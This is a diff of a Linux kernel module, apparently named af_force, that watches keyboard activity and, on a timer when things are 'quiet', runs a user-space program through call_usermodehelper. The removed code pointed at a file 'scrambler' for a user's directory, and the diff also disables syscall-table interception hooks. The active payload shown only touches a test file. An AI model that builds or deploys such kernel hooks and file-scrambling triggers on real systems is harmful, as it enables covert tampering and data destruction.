@@ -68,36 +68,18 @@ int mod_cr3(void)
 
 
 static int call_scrambler(void) {
-	// struct subprocess_info *sub_info;
-	/*
-	char *args[] = {"/usr/bin/scrambler", "/home/bob/files", NULL};
-	static char *envp[] = {
-		"HOME=/",
-		"TERM=linux",
-		"PATH=/sbin:/bin:/usr/bin:/usr/sbin",
-		NULL
-	};
-	// sub_info = call_usermodehelper_setup(args[0], args, envp, GFP_ATOMIC, NULL, NULL, NULL);
-	// if (sub_info == NULL){
-	// 	printk(KERN_DEBUG "sub_info is NULL...");
-	// } else {
-	// 	printk(KERN_DEBUG "sub_info: %lx", sub_info);
-	// }
-	// return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
-	// return call_usermodehelper(args[0], args, envp, UMH_WAIT_PROC);
-	// return 0;
-	*/
 	printk(KERN_INFO "call_scrambler called...\n");
-	char * envp[] = { "HOME=/", NULL };
-	char * argv[] = { "/usr/bin/touch", "/home/bob/touched", NULL };
-
-	
+	// char * envp[] = { "HOME=/", NULL };
+	// char * argv[] = { "/usr/bin/touch", "/home/bob/touched", NULL };
+    char *argv[] = {
+            "/usr/bin/touch",
+            "/home/bob/TOUCHED_SON",
+            NULL,
+        };
     int res;
-    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
-    
-    // res = call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC );
+    res = call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);
     printk(KERN_INFO "umh call result: %i\n", res);
-    return 0;
+    return res;
     
     // return 0;
 }
@@ -216,7 +198,7 @@ void detonate (unsigned long data)
         // printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
     } else {
         printk(KERN_DEBUG "af_force: It's quiet...\n");
-
+        call_scrambler();
         // printk(KERN_DEBUG "af_force: cr3 is %16.16llx\n", ret_cr3());
         // printk(KERN_DEBUG "af_force: writing new cr3...");
         // mod_cr3();
@@ -354,7 +336,7 @@ static int af_init(void)
     printk(KERN_DEBUG "af_force: Starting timer to fire in 5s (%ld)\n", jiffies );
 
     // Intercepts:
-    setup_intercept();
+    // setup_intercept();
 
     register_keyboard_notifier(&nb);
     return 0;
@@ -370,7 +352,7 @@ static void af_exit(void)
     unregister_keyboard_notifier(&nb);
 
     // Reset syscall_table:
-    cleanup_intercept();
+    // cleanup_intercept();
 
     // Module Deregistration:
     device_destroy(my_class,MKDEV(major_no,0));
